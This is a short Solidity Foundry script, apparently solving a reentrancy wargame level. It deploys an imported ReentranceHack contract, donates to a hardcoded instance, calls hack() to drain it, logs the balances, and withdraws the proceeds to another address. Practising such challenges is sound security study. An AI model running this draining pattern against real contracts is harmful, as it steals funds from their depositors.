// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "lib/openzeppelin-contracts/contracts/math/SafeMath.sol";
import "../src/ReentranceHack.sol";
import "forge-std/Script.sol";

contract ReentranceScript is Script {
    ReentranceHack public reentance;

    function setUp() public {
        reentance = (new ReentranceHack){value: 0.002 ether}();
    }

    function run() public {
        vm.startBroadcast();
        reentance.donate();
        console2.log(
            "intance address balance:",
            reentance.getBalance(0x76FAB4Dad6273910836AE4577FC64727174E298f)
        );
        reentance.hack();
        console2.log(
            "my contract address balance:",
            reentance.getBalance(address(reentance))
        );
        console2.log(
            "intance address balance:",
            reentance.getBalance(0x76FAB4Dad6273910836AE4577FC64727174E298f)
        );
        reentance.fundmeback(0xb1BfB47518E59Ad7568F3b6b0a71733A41fC99ad);
        console2.log(
            "my contract address balance:",
            reentance.getBalance(address(reentance))
        );
        vm.stopBroadcast();
    }
}
